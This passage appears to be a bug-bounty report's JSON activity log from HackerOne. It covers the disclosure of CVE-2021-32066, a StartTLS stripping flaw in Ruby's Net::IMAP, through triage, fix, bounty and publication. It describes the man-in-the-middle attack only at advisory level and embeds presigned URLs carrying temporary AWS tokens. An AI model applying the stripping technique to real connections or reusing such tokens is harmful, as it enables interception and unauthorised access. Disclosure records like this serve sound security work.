+      "message": "CVE-2021-32066 has been assigned:\n\n> [Suggested description]\n> An issue was discovered in Ruby through 2.6.7, 2.7.x through 2.7.3, and\n> 3.x through 3.0.1. Net::IMAP does not raise an exception when StartTLS\n> fails with an an unknown response, which might allow man-in-the-middle\n> attackers to bypass the TLS protections by leveraging a network\n> position between the client and the registry to block the StartTLS\n> command, aka a \"StartTLS stripping attack.\"\n> \n> ------------------------------------------\n> \n> [Vulnerability Type]\n> Missing SSL Certificate Validation\n> \n> ------------------------------------------\n> \n> [Vendor of Product]\n> the Ruby community\n> \n> ------------------------------------------\n> \n> [Affected Product Code Base]\n> Ruby - 3.0.1 or before\n> Ruby - 2.7.3 or before\n> Ruby - 2.6.7 or before\n> \n> ------------------------------------------\n> \n> [Affected Component]\n> Net::IMAP\n> \n> ------------------------------------------\n> \n> [Attack Type]\n> Remote\n> \n> ------------------------------------------\n> \n> [Impact Information Disclosure]\n> true\n> \n> ------------------------------------------\n> \n> [Attack Vectors]\n> To exploit vulnerability, a user must connect to a malicious MITM IMAP server.\n> \n> ------------------------------------------\n> \n> [Reference]\n> https://hackerone.com/reports/1178562\n> \n> ------------------------------------------\n> \n> [Has vendor confirmed or acknowledged the vulnerability?]\n> true\n> \n> ------------------------------------------\n> \n> [Discoverer]\n> Alexandr Savca\n\nUse CVE-2021-32066.\n\n\n-- \nCVE Assignment Team\nM/S M300, 202 Burlington Road, Bedford, MA 01730 USA\n[ A PGP key is available for encrypted communications at\n  https://cve.mitre.org/cve/request_id.html ]\n",
+      "automated_response": false,
+      "created_at": "2021-05-07T00:12:15.969Z",
+      "updated_at": "2021-05-07T00:12:15.969Z",
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11650825,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-07T02:43:28.510Z",
+      "updated_at": "2021-05-07T02:43:28.510Z",
+      "cve_ids": [
+        "CVE-2021-32066"
+      ],
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071117Z&X-Amz-Expires=1824&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=987c7e14b45043a25648de0f4533f9a16d5420eb77a9f5009afa0315f16907c9"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11677955,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-10T04:25:08.392Z",
+      "updated_at": "2021-05-10T04:25:08.392Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071117Z&X-Amz-Expires=1824&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=987c7e14b45043a25648de0f4533f9a16d5420eb77a9f5009afa0315f16907c9"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 12392104,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "We have released new versions of Ruby and have published the vulnerability.\n\n  https://www.ruby-lang.org/en/news/2021/07/07/starttls-stripping-in-net-imap/\n\nThank you.\n",
+      "automated_response": false,
+      "created_at": "2021-07-08T01:08:22.126Z",
+      "updated_at": "2021-07-08T01:08:22.126Z",
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "sighook",
+        "url": "/sighook"
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 12392106,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-08T01:09:28.789Z",
+      "updated_at": "2021-07-08T01:09:28.789Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 12392188,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-08T01:39:07.635Z",
+      "updated_at": "2021-07-08T01:39:07.635Z",
+      "actor": {
+        "url": "/ruby",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "ruby",
+      "collaborator": {
+        "username": "sighook",
+        "url": "/sighook"
+      }
+    },
+    {
+      "id": 12404174,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-08T15:34:20.126Z",
+      "updated_at": "2021-07-08T15:34:20.126Z",
+      "actor": {
+        "username": "sighook",
+        "cleared": false,
+        "verified": false,
+        "url": "/sighook",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 12404175,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-08T15:34:20.224Z",
+      "updated_at": "2021-07-08T15:34:20.224Z",
+      "actor": {
+        "username": "sighook",
+        "cleared": false,
+        "verified": false,
+        "url": "/sighook",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
